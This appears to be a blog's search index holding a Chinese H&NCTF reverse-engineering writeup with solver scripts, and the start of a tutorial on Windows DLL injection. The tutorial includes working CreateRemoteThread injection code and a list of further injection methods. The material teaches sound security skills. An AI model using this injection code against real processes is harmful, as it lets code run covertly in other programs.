<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>24H&amp;N逆向-WP</title>
      <link href="/posts/96e9c478.html"/>
      <url>/posts/96e9c478.html</url>
      
        <content type="html"><![CDATA[<h1>24H&amp;N逆向部分wp</h1><p>菜鸡新手师傅wp，Re 5/9，记录一下qaq</p><h3 id="最喜欢的逆向题"><strong>最喜欢的逆向题</strong></h3><p>64位，进主函数之后直接看，要求输入第5位为i，然后后面依次相等，长度为24，就输出flag</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240516004300765-2002990542.png" alt="image-20240516004257710"></p><p>按照要求输入即可：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240516004320573-1023745532.png" alt="image-20240516004318413"></p><h3 id="DO-YOU-KNOW-SWDD">DO YOU KNOW SWDD?</h3><p>主函数中函数并不多，一直跟进sub_41127B到最后你就会发现就是一个简单的smc</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240516004336318-51756066.png" alt="image-20240516004333994"></p><p>待解密部分：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240516004358274-2100022846.png" alt="image-20240516004355826"></p><p>idapython patch一下即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">addr = <span class="number">0x00417000</span></span><br><span class="line">v5 = <span class="string">&quot;swdd&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">331</span>):</span><br><span class="line">        temp = addr+i</span><br><span class="line">        value = idc.get_wide_byte(temp)</span><br><span class="line">        value ^=<span class="built_in">ord</span>(v5[j])</span><br><span class="line">        ida_bytes.patch_byte(temp,value)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到加密逻辑如下：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240516004416758-209971143.png" alt="image-20240516004414169"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">83</span>,<span class="number">95</span>,<span class="number">86</span>,<span class="number">89</span>,<span class="number">70</span>,<span class="number">79</span>,<span class="number">95</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">78</span>,<span class="number">78</span>,<span class="number">95</span>,<span class="number">71</span>,<span class="number">82</span>,<span class="number">75</span>,<span class="number">68</span>,<span class="number">95</span>,<span class="number">75</span>,<span class="number">76</span>,<span class="number">89</span>,<span class="number">69</span>,<span class="number">68</span>,<span class="number">95</span>,<span class="number">73</span>,<span class="number">89</span>,<span class="number">69</span>]<span class="comment">#S_VYFO_CGNN_GRKD_KLYED_IYE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    <span class="keyword">if</span>(data[i]&gt;=<span class="number">65</span> <span class="keyword">and</span> data[i]&lt;=<span class="number">90</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>((data[i]-<span class="number">10</span>-<span class="number">65</span>)%<span class="number">26</span>+<span class="number">65</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(data[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#I_LOVE_SWDD_WHAT_ABOUT_YOU</span></span><br></pre></td></tr></table></figure><h3 id="hwanna">hwanna</h3><p>直接看Assembly-CSharp.dll</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240516002257085-1091112832.png" alt="image-20240516002252596"></p><p>直接用python跑一下既可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>(<span class="params"><span class="built_in">input</span>, shift</span>):</span><br><span class="line">    text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">input</span>:</span><br><span class="line">        <span class="keyword">if</span> c.isalpha():  <span class="comment"># 检查字符是否为字母</span></span><br><span class="line">            <span class="comment"># 使用ord()函数获取字符的ASCII码，然后进行偏移操作，最后使用chr()函数转换回字符</span></span><br><span class="line">            text += <span class="built_in">chr</span>((<span class="built_in">ord</span>(c.lower()) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) <span class="keyword">if</span> c.islower() <span class="keyword">else</span> <span class="built_in">chr</span>((<span class="built_in">ord</span>(c.upper()) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            text += c</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line">data = <span class="string">&quot;justaeasyunitygame&quot;</span></span><br><span class="line"></span><br><span class="line">aaa = a(data,<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(aaa)</span><br><span class="line"><span class="comment">#套上flag头即可H&amp;NCTF&#123;ozxyfjfxdzsnydlfrj&#125;</span></span><br></pre></td></tr></table></figure><h3 id="childmaze">childmaze</h3><p>一开始用的ida7.5，符号表一直载入不了，f5也看不了，动调也调不起来，纯坐牢了属于是，但看到一堆函数，同时有点混淆的感觉，寻思用d810去去混淆，用ida8.3打开了一下，发现可以正常载入符号表，看出来是rust，动调还是调不起来，难绷，大概逛了一下代码，找到应该是密文</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240516002948714-1098707363.png" alt="image-20240516002945995"></p><p>没有逆向逻辑，就是在走完所有地图之后正常解密，用python跑一下直接出了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">&quot;H&#x27;L@PC&#125;Ci625`hG2]3bZK4&#123;1~&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((<span class="built_in">ord</span>(data[i]))^(i%<span class="number">7</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#H&amp;NCTF&#123;Ch411enG3_0f_M4z3&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Baby-OBVBS"><strong>Baby_OBVBS</strong></h3><p>查看vbs源码发现是一长串，确定是混淆无疑，execute是执行，即是执行后面这一长段</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240516004438942-1561112150.png" alt="image-20240516004436789"></p><p>跑起来用ce附加了一下，查找了一下关键字符串&quot;Enter the key:&quot;，发现了真正的代码逻辑：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240516004546672-523054618.png" alt="image-20240516004544014"></p><p>dump下来之后确认为输入的key做了一个MD5的加密之后判断，然后flag是一个RC4的加密</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240516004640655-119042299.png" alt="image-20240516004638074"></p><p>而解密的关键是找到MD5的密文和RC4的密文，ANtg和eAqi，显然从dump下来的东西里已然没有这个信息了</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240516004658781-97328075.png" alt="image-20240516004656266"></p><p>所以还是得从给的vbs脚本入手，执行脚本之后能看到去混淆的代码，所以直接将所需要执行的带混淆的输出一下即可，将原先脚本中开头命令换成 WScript.Echo（vbs里的语法，类似c里面的printf），修改一下保存为vbs，运行并能看到代码逻辑以及需要的密文</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240516004738868-1690107087.png" alt="image-20240516004736786"></p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240516005145747-598323821.png" alt="image-20240516005142016"></p><p>加密部分还是带了base64加密，正常解码就能看出是MD5和RC4，但现在不用了，直接取开头的两个密文即可，MD5解完之后是<code>H&amp;NKEY</code>，然后直接RC4解就行，找个在线网站解了</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240516005400463-1380820770.png" alt="image-20240516005357675"></p><p><code>H&amp;NCTF&#123;VBS_1s_@_s0_7unny_an4_pow3rfu1_t00l!&#125;</code></p><h3 id="隐藏的眼睛">隐藏的眼睛</h3><p>比赛时候瞅了一眼，一堆爆红，貌似还是个病毒，解也不多，就没细看，后期复现了一下</p><p>拉进ida全是爆红，有点懵逼，看了wp说是程序大量动态调用与api重写导致ida静态分析函数爆红，眼瞅着下图中一眼有个myDLL，还有一个LocalHide（这个应该就是一个自隐藏，类似删除吧）</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240530000438947-619383326.png" alt="image-20240530000433771"></p><p>这块儿应该就是一个检测虚拟环境的部分，启动虚拟环境之后，查看进程就会发现有挂载这些东西，所以这块的作用应该就是检测</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240530001026259-438172162.png" alt="image-20240530001025145"></p><p>继续往下逛就是基本每个函数点进去都有爆红，只能随便看看信息了，下面这个好像是检测运行环境的，chat之后的结果是<code>RtlGetVersion</code> 是 Windows 操作系统中一个未公开的函数，属于 Runtime Library (RTL) 部分。这个函数用于获取当前操作系统的版本信息。由于它是未公开的，也就是说它不是 Microsoft 官方文档中明确定义的 API，因此使用它存在一定的风险，比如在未来版本的 Windows 中可能不再支持或者行为发生变化。</p><p>嗯，没啥用</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240530001451226-2144095101.png" alt="image-20240530001450379"></p><p>逛一圈只有最后这个函数能进去</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240530001630826-370473968.png" alt="image-20240530001629716"></p><p>进去之后有大发现，一眼顶针鉴定为xxtea的shellcode，同时这个程序是没有提示输入之类的，按道理直接把这个过程走一遍就能出，但是动调是过不来这块的</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240530001755218-1391186822.png" alt="image-20240530001754306"></p><p>所以这个题的考点感觉还是在过一开始的那个隐藏吧，加载了一个dll声明了LocalHide函数（顾名思义程序的本地隐藏）赋值给了v4，然后作为函数执行</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240530002056652-238907132.png" alt="image-20240530002055650"></p><p>倒是第一次知道这种做法，直接拉到dbg里结合ida调试直接就可以过了，基址是对齐的，直接找就行</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240530002402983-212840179.png" alt="image-20240530002401789"></p><p>设置完新运行点之后，再找到xxtea完之后的这个函数（感觉是一个check吧），然后断下来直接f9过来就好了</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240530002734619-830770876.png" alt="image-20240530002733196"></p><p>xor为check，其中的edx的值是从rdi的地址中取的，内存窗口直接跟过去就可以看到flag了，这种方法我只能说狠狠的学到了</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202405/3445027-20240530003032128-656646520.png" alt="image-20240530003030727"></p><p><code>H&amp;NCTF&#123;0h!!_Y0u_F0UND_MY_1P_ADDRESs&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLL注入技术简介</title>
      <link href="/posts/db93cbbc.html"/>
      <url>/posts/db93cbbc.html</url>
      
        <content type="html"><![CDATA[<h1>DLL注入技术</h1><p>属于是非常笼统了，基本没有啥自己写的东西qaq</p><h2 id="一-dll注入的概念">一.dll注入的概念</h2><p>​当一个进程运行时，它会加载并使用一些<strong>动态链接库</strong>（DLL）来提供额外的功能和资源。这些DLL可以被多个进程共享，使得代码重用和资源共享变得更加高效。DLL注入技术利用了这种共享机制。它允许向正在运行的进程中注入一个动态链接库（DLL），被注入的DLL可以利用它所在的进程的权限执行一些特殊的任务，比如修改进程内存中的数据、劫持进程的执行流程、监控进程的行为等等。<br>​<strong>dll注入的本质就是把一个不属于某个进程的dll文件加载到该进程当中。</strong></p><p>​<strong>DLL注入与一般DLL加载的主要区别是加载的目标进程是其自身或者其他进程。</strong></p><p>​插入基础知识：</p><p>​<strong>Kernel32.dll</strong>(包含管理内存，进程和线程相关的函数)，“<strong>User32.dll</strong>”(大部分是用户接口函数)，和“<strong>GDI32.dll</strong>”(绘制图像和显示文本相关的函数)</p><h2 id="二-dll技术的应用（主要方面）">二.dll技术的应用（主要方面）</h2><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606170734984-1603617283.png" alt="image-20231008193615305"></p><h2 id="三-dll相关的API">三.dll相关的API</h2><table><thead><tr><th>OpenProcess</th><th style="text-align:left">打开远程进程</th></tr></thead><tbody><tr><td>VirtualAllocEx</td><td style="text-align:left">在远程进程中申请内存空间</td></tr><tr><td>WriteProcessMemory</td><td style="text-align:left">写入数据到远程进程</td></tr><tr><td>CreateRemoteThread</td><td style="text-align:left">创建远程线程</td></tr><tr><td>Loadlibrary</td><td style="text-align:left">加载模块</td></tr><tr><td>WaitForSingleObject</td><td style="text-align:left">等待信号</td></tr><tr><td>VirturalFreeEx</td><td style="text-align:left">释放远程进程内存空间</td></tr><tr><td>CloseHandle</td><td style="text-align:left">关闭句柄</td></tr></tbody></table><h2 id="四-编写代码前的准备工作：">四.编写代码前的准备工作：</h2><h3 id="1-OpenProcess函数">1.OpenProcess函数</h3><p>​OpenProcess是windows操作系统提供的一个函数，它用于打开一个现有的进程，并返回一个与该进程关联的进程句柄。该函数的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">OpenProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">  DWORD dwDesiredAccess,</span></span><br><span class="line"><span class="params">  BOOL bInheritHandle,</span></span><br><span class="line"><span class="params">  DWORD dwProcessId</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数说明：</p><p>dwDesiredAccess：指定进程的访问权限。这可以是一些常量值的组合，如PROCESS_ALL_ACCESS、PROCESS_CREATE_PROCESS、PROCESS_QUERY_INFORMATION等。<br>bInheritHandle：指定新句柄是否可以被继承。如果为TRUE，则新句柄可以被继承；如果为FALSE，则新句柄不可以被继承。<br>dwProcessId：指定要打开的进程的进程ID号。</p><p><strong>OpenProcess函数可以用于获取一个现有进程的句柄，以便在该进程中执行一些操作，如读取或写入进程内存、修改进程的安全属性、发送消息等。需要注意的是，不同的进程拥有不同的访问权限，因此在使用OpenProcess函数时需要正确设置进程的访问权限，以避免权限问题导致的操作失败。</strong></p><p>OpenProcess函数常用于编写一些系统工具或调试程序，以及一些需要与其他进程交互的应用程序。<strong>在编写一些恶意软件或攻击程序时，OpenProcess函数也可以被用于获取另一个进程的句柄，并对其进行一些未授权的操作</strong>。因此，在使用OpenProcess函数时需要谨慎，以避免对系统造成不良影响。</p><h3 id="2-VirtualAllocEx函数">2.VirtualAllocEx函数</h3><p>VirtualAllocEx是Windows操作系统提供的一个函数，用于在指定进程的虚拟地址空间中分配内存。函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LPVOID <span class="title function_">VirtualAllocEx</span><span class="params">(</span></span><br><span class="line"><span class="params">  HANDLE hProcess,</span></span><br><span class="line"><span class="params">  LPVOID lpAddress,</span></span><br><span class="line"><span class="params">  SIZE_T dwSize,</span></span><br><span class="line"><span class="params">  DWORD flAllocationType,</span></span><br><span class="line"><span class="params">  DWORD flProtect</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>函数参数说明：</p><p>hProcess：指定要在哪个进程中分配内存，该参数需要指定要分配内存的进程句柄。<br>lpAddress：指定欲分配的虚拟内存起始地址，如果为NULL，表示由系统自动选择一个合适的地址。<br>dwSize：指定要分配的内存大小，以字节为单位。<br>flAllocationType：指定内存分配的类型，可以使用一些常量值如MEM_COMMIT、MEM_RESERVE等。<br>flProtect：指定内存的保护属性，可以使用一些常量值如PAGE_READWRITE、PAGE_EXECUTE_READ等。</p><p><strong>VirtualAllocEx函数的返回值是一个LPVOID类型的指针，指向在指定进程的虚拟地址空间中分配的内存的起始地址。如果函数调用失败，则返回NULL</strong></p><p>使用VirtualAllocEx函数可以实现在指定进程的虚拟地址空间中分配内存，从而使得其他进程可以访问和使用该内存。需要注意的是，<strong>使用VirtualAllocEx函数分配的内存需要在使用完毕后通过VirtualFreeEx函数释放</strong>，以避免内存泄漏和资源浪费。</p><h3 id="3-WriteProcessMemory函数：">3.WriteProcessMemory函数：</h3><p>WriteProcessMemory函数是Windows API中的一个函数，它可以将数据写入到指定进程的内存中。该函数可以用于在一个进程中注入代码或数据，实现进程间通信等功能。声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">WriteProcessMemory</span><span class="params">(</span></span><br><span class="line"><span class="params">  HANDLE  hProcess,</span></span><br><span class="line"><span class="params">  LPVOID  lpBaseAddress,</span></span><br><span class="line"><span class="params">  LPCVOID lpBuffer,</span></span><br><span class="line"><span class="params">  SIZE_T  nSize,</span></span><br><span class="line"><span class="params">  SIZE_T  *lpNumberOfBytesWritten</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数说明：</p><p>hProcess：目标进程的句柄。<br>lpBaseAddress：要写入数据的目标进程内存的起始地址。<br>lpBuffer：要写入的数据缓冲区的指针。<br>nSize：要写入的数据的大小，以字节为单位。<br>lpNumberOfBytesWritten：一个指向变量的指针，用于接收实际写入的字节数。</p><p>WriteProcessMemory函数返回的是一个<em><strong>布尔类型</strong></em>的值，表示有没有写内存成功。</p><h3 id="4-CreateRemoteThread函数">4.CreateRemoteThread函数</h3><p>CreateRemoteThread是Windows操作系统提供的一个函数，它可以在指定的进程空间中创建一个<strong>远程线程</strong>，以便在该进程中执行指定的函数。函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateRemoteThread</span><span class="params">(</span></span><br><span class="line"><span class="params">  HANDLE hProcess,</span></span><br><span class="line"><span class="params">  LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="line"><span class="params">  SIZE_T dwStackSize,</span></span><br><span class="line"><span class="params">  LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">  LPVOID lpParameter,</span></span><br><span class="line"><span class="params">  DWORD dwCreationFlags,</span></span><br><span class="line"><span class="params">  LPDWORD lpThreadId</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>函数参数说明：</p><p>hProcess：指定要在哪个进程中创建线程，该参数需要指定要创建线程的进程句柄。<br>lpThreadAttributes：指定线程的安全属性，如果不需要设置，则传入NULL即可。<br>dwStackSize：指定线程的堆栈大小，如果不需要设置，则传入0即可。<br>lpStartAddress：指定要在远程线程中执行的函数地址。<br>lpParameter：指定要传递给远程线程的参数。<br>dwCreationFlags：指定线程的创建标志，可以使用一些常量值如0、CREATE_SUSPENDED等。<br>lpThreadId：指向一个变量，用于返回线程ID号。</p><p>使用CreateRemoteThread函数可以实现在一个进程空间中注入一个线程，并且可以传递一些参数给该线程。该函数常用于编写一些系统工具或调试程序，以及一些需要与其他进程交互的应用程序。</p><p>以下是一个使用CreateRemoteThread函数实现DLL注入的示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 获取目标进程句柄</span></span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, <span class="number">1234</span>);</span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取LoadLibrary函数地址</span></span><br><span class="line">    LPVOID lpLoadLibrary = GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (lpLoadLibrary == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 分配内存空间</span></span><br><span class="line">    LPVOID lpDllPath = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="built_in">strlen</span>(<span class="string">&quot;C:\\test.dll&quot;</span>) + <span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (lpDllPath == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 将DLL路径写入目标进程内存</span></span><br><span class="line">    WriteProcessMemory(hProcess, lpDllPath, <span class="string">&quot;C:\\test.dll&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;C:\\test.dll&quot;</span>) + <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 在目标进程中创建远程线程</span></span><br><span class="line">    HANDLE hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)lpLoadLibrary, lpDllPath, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        VirtualFreeEx(hProcess, lpDllPath, <span class="built_in">strlen</span>(<span class="string">&quot;C:\\test.dll&quot;</span>) + <span class="number">1</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 等待线程结束</span></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 关闭句柄，释放内存</span></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    VirtualFreeEx(hProcess, lpDllPath, <span class="built_in">strlen</span>(<span class="string">&quot;C:\\test.dll&quot;</span>) + <span class="number">1</span>, MEM_RELEASE);</span><br><span class="line">    CloseHandle(hProcess);</span><br></pre></td></tr></table></figure><h3 id="5-LoadLibrary函数">5.LoadLibrary函数</h3><p>LoadLibrary函数是Windows操作系统提供的一个函数，它可以加载一个动态链接库（DLL）文件到进程空间中，并返回该DLL的句柄。</p><p>需要注意的是<strong>它仅仅是把dll文件加载到进程的空间，但是想要调用这个dll还需要别的操作，比如在这个dll的DllMain里面添加附加到线程的时候执行</strong>等等。</p><p><code>DllMain</code> 是 Windows DLL 中的一个特殊函数，用于处理 DLL 的加载、卸载以及其他状态的通知。</p><p>该函数的签名为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)</span>;</span><br></pre></td></tr></table></figure><p>参数说明：</p><p>hModule: DLL 的模块句柄。该参数可以用来获取 DLL 中的其他资源，例如资源文件、函数地址等。<br>ul_reason_for_call: 表示 DLL 被加载、卸载或者其他状态的通知。可能的值包括：<br>DLL_PROCESS_ATTACH: DLL 被进程加载时调用。<br>DLL_PROCESS_DETACH: DLL 被进程卸载时调用。<br>DLL_THREAD_ATTACH: 进程创建新线程时调用。<br>DLL_THREAD_DETACH: 进程中线程退出时调用。<br>lpReserved: 保留参数。在实际开发中，一般不使用该参数。<br>在<strong>实际使用中，DllMain 函数常用于执行一些初始化或清理操作</strong>，例如：</p><p>在 DLL 加载时，进行资源的初始化，例如初始化共享内存、建立临界区等。<br>在 DLL 卸载时，进行资源的释放，例如清除共享内存、释放临界区等。<br>需要注意的是，在 DllMain 函数中，有一些操作是不安全的，例如：</p><p>调用其他 DLL 函数。这可能会导致死锁或死循环，因为其他 DLL 函数也可能调用 DllMain 函数。<br>创建新线程。<strong>在 DllMain 函数中创建新线程可能会导致死锁，因为该函数会在 DLL 加载之前被调用，此时可能没有完成初始化操作。</strong><br>调用某些系统函数。某些系统函数可能会使用其他 DLL，这可能会导致死锁或死循环。<br>因此，在编写 DllMain 函数时需要小心谨慎，避免出现安全问题。</p><h2 id="五-DLL注入四个步骤">五.DLL注入四个步骤</h2><p>(四个步骤)</p><p><strong>1）附加</strong>到目标/远程进程</p><p>2）在目标/远程进程内<strong>分配内存</strong></p><p>3）将DLL文件路径，或者DLL文件，<strong>复制到目标/远程进程的内存空间</strong></p><p>4）控制进程<strong>运行DLL文件</strong></p><h3 id="1-技术介绍：">1.技术介绍：</h3><p>​我们有多种方式可以控制进程运行我们的DLL文件。最普通的应该是“CreateRemoteThread()”和“NtCreateThreadEx()”函数；然而，不可能仅仅向这些函数传递一个DLL文件作为参数，我们必须<strong>提供一个包含执行起点的内存地址</strong>。为此，我们需要分配内存，使用“LoadLibrary()”加载我们的DLL文件，复制内存，等等。</p><p>​以下还有7种注入方法：</p><ul><li>CreateRemoteThread()</li><li>NtCreateThreadEx()</li><li>QueueUserAPC</li><li>SetWindowsHookEx()</li><li>RtlCreateUserThread()</li><li>利用SetThreadContext()找到的代码区域</li><li>反射DLL</li></ul><h3 id="2-LoadLibrary-附加函数原型和参数补充">2.<strong>LoadLibrary()</strong>[附加函数原型和参数补充]</h3><p>“LoadLibrary()”函数“被用于向调用进程的地址空间加载指定模块，而该指定模块可能导致其他模块被加载”。<strong>函数原型与参数说明</strong>如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HMODULE WINAPI <span class="title function_">LoadLibrary</span><span class="params">(</span></span><br><span class="line"><span class="params">_IN_ LPCRSTR lpFileName</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="comment">//lpFileName    [输入参数]</span></span><br><span class="line"><span class="comment">//模块名称。该模块可能是一个库模块（.dll文件），或者一个可执行模块（.exe文件）</span></span><br><span class="line"><span class="comment">//（…）</span></span><br><span class="line"><span class="comment">//若字符串指定了一个完全路径，则函数只在该路径下搜索模块；</span></span><br><span 